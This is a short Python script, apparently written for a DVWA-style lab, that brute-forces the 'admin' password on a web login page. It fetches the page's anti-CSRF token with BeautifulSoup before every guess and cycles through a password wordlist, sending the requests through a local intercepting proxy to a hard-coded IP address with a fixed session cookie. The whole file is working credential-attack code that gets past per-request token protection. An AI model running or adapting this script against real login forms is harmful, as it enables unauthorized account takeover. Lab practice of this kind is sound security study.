from bs4 import BeautifulSoup
import urllib.request

proxies = {
    'https': 'https://127.0.0.1:8080',
    'http': 'http://127.0.0.1:8080'
}

header={        'Host': '65.49.195.58:8080',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Referer': 'http://65.49.195.58:8080/vulnerabilities/brute/',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Cookie': 'security=high; PHPSESSID=3omgnvore9j6uqqns0cevaio57',
		'Connection': 'close',
		'Upgrade-Insecure-Requests': '1'}
requrl = "http://65.49.195.58:8080/vulnerabilities/brute/"

def get_token(requrl,header):
	opener = urllib.request.build_opener(urllib.request.ProxyHandler(proxies))
	urllib.request.install_opener(opener)
	req = urllib.request.Request(url=requrl,headers=header)
	response = urllib.request.urlopen(req)
	print(response.getcode())
	the_page = response.read()
	print(len(the_page))
	soup = BeautifulSoup(the_page,"html.parser")
	#user_token = soup.form.input.input.input.input["value"] #get the user_token
	user_token = soup.find_all('input', attrs={"name":"user_token"})[0].get("value")
	return user_token

user_token = get_token(requrl,header)
i=0
for line in open("directory_pass_short.txt"):
	requrl = "http://65.49.195.58:8080/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token
	i = i+1
	print(i,'admin',line.strip())
	user_token = get_token(requrl,header)